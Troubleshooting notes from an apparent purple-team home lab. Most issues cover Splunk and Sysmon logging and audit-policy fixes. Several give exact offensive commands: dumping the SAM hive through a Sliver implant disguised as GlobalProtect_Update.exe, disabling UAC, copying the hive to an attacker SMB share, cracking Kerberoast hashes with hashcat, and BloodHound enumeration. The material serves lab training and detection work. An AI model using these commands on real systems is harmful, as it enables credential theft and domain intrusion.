**English** · **[Srpski](lab_issues.sr.md)**

# Purple Team Home Lab — Issues & Solutions

**Documented problems during setup and testing**
This is excellent CV material — it demonstrates troubleshooting skills in an enterprise environment.

---

## ISSUE #1 — Sysmon EC3 not arriving in Splunk

**Symptom:** `EventCode=3` queries return empty even though Sysmon is generating events locally.

**Root cause:** Two separate problems:
1. `inputs.conf` in `etc\system\local` missing `start_from = oldest` and `current_only = 0`
2. `etc\apps\SplunkUniversalForwarder\local\inputs.conf` overrides system config but has no Sysmon stanza

**Fix:**
```powershell
# Add to system\local\inputs.conf for Sysmon stanza
$content = Get-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
$content = $content -replace "\[WinEventLog://Microsoft-Windows-Sysmon/Operational\]", "[WinEventLog://Microsoft-Windows-Sysmon/Operational]`nstart_from = oldest`ncurrent_only = 0`ncheckpointInterval = 5"
Set-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf" $content
```

**Add Sysmon to app inputs.conf:**
```powershell
Add-Content "C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\inputs.conf" "`n[WinEventLog://Microsoft-Windows-Sysmon/Operational]`ndisabled = 0`nindex = main`nsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational"
```

**Restart:**
```powershell
Restart-Service SplunkForwarder
```

**Lesson learned:** Splunk forwarder app configs take priority over system configs. Always check both locations.

---

## ISSUE #2 — Sysmon log ACL — forwarder has no access

**Symptom:** Forwarder starts but does not read Sysmon log. No Sysmon errors in splunkd.log.

**Root cause:** `channelAccess` on the Sysmon Operational log does not include the Network Service (`NS`) SID that the Splunk forwarder uses.

**Diagnosis:**
```cmd
wevtutil.exe gl "Microsoft-Windows-Sysmon/Operational"
# Check channelAccess — must include (A;;0x1;;;NS)
```

**Fix:**
```cmd
wevtutil.exe sl "Microsoft-Windows-Sysmon/Operational" /ca:O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x1;;;BO)(A;;0x1;;;SO)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)
```

**Lesson learned:** Sysmon log has a custom channelAccess. When Sysmon is reinstalled or restarted, the ACL can reset. Add this command to the pre-flight checklist.

---

## ISSUE #3 — EC4769 (Kerberoasting) not logging

**Symptom:** Kerberoasting executed but Splunk receives no EC4769. Local auditpol shows "No Auditing" even after `auditpol /set`.

**Root cause:** Group Policy overrides local auditpol. On the Domain Controller, `Default Domain Controllers Policy` controls audit settings. Local `auditpol /set` has no effect.

**Fix — on HYDRA-DC:**
```
gpmc.msc → Forest → Domains → MARVEL.local → Domain Controllers →
Default Domain Controllers Policy → Edit →
Computer Configuration → Policies → Windows Settings → Security Settings →
Advanced Audit Policy Configuration → Audit Policies → Account Logon →
Audit Kerberos Service Ticket Operations → Success and Failure
```

**Verify:**
```cmd
gpupdate /force
auditpol /get /subcategory:"Kerberos Service Ticket Operations"
# Must show: Success and Failure
```

**Lesson learned:** On domain-joined machines, always configure audit policy via GPO, not locally. Local auditpol is ignored when a GPO setting exists.

---

## ISSUE #4 — EC4698 (Scheduled Task) not logging

**Symptom:** Scheduled task created but no EC4698 in Splunk. `auditpol /get` shows "No Auditing" for "Other Object Access Events" even after local set.

**Root cause:** Same issue as #3 — GPO override. For endpoint machines, `Default Domain Policy` controls audit settings.

**Fix — on HYDRA-DC:**
```
gpmc.msc → Default Domain Policy → Edit →
Computer Configuration → Policies → Windows Settings → Security Settings →
Advanced Audit Policy Configuration → Audit Policies → Object Access →
Audit Other Object Access Events → Success and Failure
```

**While you're there, also set:**
- Audit File System → S&F
- Audit Registry → S&F
- Audit SAM → S&F
- Audit Handle Manipulation → S&F

**On endpoint:**
```cmd
gpupdate /force
auditpol /get /subcategory:"Other Object Access Events"
```

**Lesson learned:** Scheduled Task audit (EC4698) requires "Other Object Access Events" via GPO on all machines, not just on the DC.

---

## ISSUE #5 — reg save Access Denied through Sliver shell

**Symptom:** `reg save HKLM\SAM` returns "Access Denied" even when the user is in the Administrators group.

**Root cause:** UAC (User Account Control) is enabled. Even Administrator users get a split token — standard token for normal operations, elevated token only when explicitly accepting a UAC prompt. Sliver shell inherits the non-elevated token.

**Temporary fix for lab — disable UAC on THEPUNISHER:**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
# Reboot
```

**Alternative without UAC disable — run implant elevated:**
- Right-click GlobalProtect_Update.exe → Run as Administrator
- New Sliver session will have an elevated token

**Verify:**
```cmd
whoami /priv | findstr SeBackupPrivilege
# Must show SeBackupPrivilege (Disabled is ok — reg save will enable it)
```

**Lesson learned:** In a real enterprise, UAC bypass is a separate technique (T1548.002). For lab demo, we disable UAC to focus the narrative on credential dumping, not UAC bypass.

---

## ISSUE #6 — SMB share Access Denied when copying hive files

**Symptom:** `copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive` returns "Access Denied" or "Network path not found".

**Root cause:** impacket-smbserver without authentication requires Windows to authenticate anonymously. Newer Windows versions block this.

**Fix — run with credentials:**
```bash
# Kali — kill old share
sudo kill -9 $(sudo lsof -t -i:445)

# Create directory with permissions
mkdir -p /tmp/share
chmod 777 /tmp/share

# Start with authentication
sudo impacket-smbserver share /tmp/share -smb2support -username kali -password kali
```

**On THEPUNISHER — authenticate before copying:**
```cmd
net use \\192.168.182.133\share /user:kali kali
copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive
```

**Lesson learned:** Always run impacket-smbserver with `-username` and `-password`. Anonymous SMB shares do not work reliably with modern Windows versions.

---

## ISSUE #7 — Hashcat memory error on Kali VM

**Symptom:** Hashcat crashes with "Not enough allocatable device memory" on Kali VM with 1GB RAM.

**Root cause:** Kali VM has only 1GB RAM. Hashcat for mode 13100 (Kerberos TGS) requires a minimum of ~512MB allocatable memory for dictionary attack with rockyou.txt.

**Fix option 1 — increase Kali VM RAM to 2GB** (recommended)

**Fix option 2 — use John the Ripper:**
```bash
john /tmp/kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

**Fix option 3 — hashcat with -O flag (optimized kernels):**
```bash
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force -O
```

**Lesson learned:** Kali VM needs minimum 2GB RAM for hashcat. John is an alternative with a much smaller footprint.

---

## ISSUE #8 — Sysmon config not applying — schema version mismatch

**Symptom:** `sysmon64 -c config.xml` gives an error or does not apply new rules.

**Root cause:** Config file uses schema version 4.50 but installed Sysmon is version 15.15 (schema 4.90). Not a fatal error but can cause unexpected behavior.

**Check:**
```cmd
sysmon64 -c
# Shows current configuration and schema version
```

**Resolution:** Config with schema 4.50 runs on Sysmon 15.15 with a warning. For production — update config to a newer schema version.

---

## ISSUE #9 — Splunk restart as wrong user

**Symptom:** `/opt/splunk/bin/splunk restart` returns "Failed to run splunk as SPLUNK_OS_USER."

**Root cause:** Splunk is configured to run as a specific OS user. Running as a different user is not allowed.

**Fix:**
```bash
sudo /opt/splunk/bin/splunk restart
# or
sudo -u splunk /opt/splunk/bin/splunk restart
```

---

## ISSUE #10 — Timestamp problem after VM pause/resume

**Symptom:** Splunk events have wrong timestamps after VM pause/resume. Events can be an hour or more ahead/behind.

**Root cause:** VM clock desyncs on pause/resume. Windows Time Service (W32tm) does not resync automatically fast enough.

**Fix — on all Windows machines:**
```powershell
w32tm /resync /force
```

**Fix — Splunk props.conf (for Sysmon):**
```ini
[WinEventLog:Microsoft-Windows-Sysmon/Operational]
DATETIME_CONFIG = CURRENT
MAX_TIMESTAMP_LOOKAHEAD = 128
```

**Lesson learned:** Always run `w32tm /resync /force` before recording. Add to pre-flight checklist.

---

## ISSUE #11 — BloodHound uses IPv6 for LDAP connection

**Symptom:** BloodHound-python connects to IPv6 address instead of IPv4, can cause timeouts in some configurations.

**Symptom in output:**
```
INFO: Testing resolved hostname connectivity fd15:4ba5:5a2b:1008:...
INFO: Trying LDAP connection to fd15:4ba5:5a2b:...
```

**Root cause:** DNS resolve returns both IPv6 and IPv4 for HYDRA-DC. Python prefers IPv6.

**Workaround:** Explicitly specify IPv4 with `-ns` parameter (already done):
```bash
bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135
```

**Status:** Works despite the IPv6 connection — enumeration is successful.

---

## SUMMARY — Critical steps before recording

| Step | Machine | Command |
|---|---|---|
| Sysmon inputs.conf fix | All Windows | `start_from = oldest`, `current_only = 0` |
| Sysmon ACL fix | All Windows | `wevtutil.exe sl ... /ca:...NS)` |
| Kerberos audit GPO | HYDRA-DC | Default Domain Controllers Policy |
| Object Access audit GPO | HYDRA-DC | Default Domain Policy |
| UAC disable | THEPUNISHER | `EnableLUA = 0` + reboot |
| SMB share with auth | Kali | `-username kali -password kali` |
| Kali RAM | VMware | Minimum 2GB |
| Timestamp sync | All Windows | `w32tm /resync /force` |
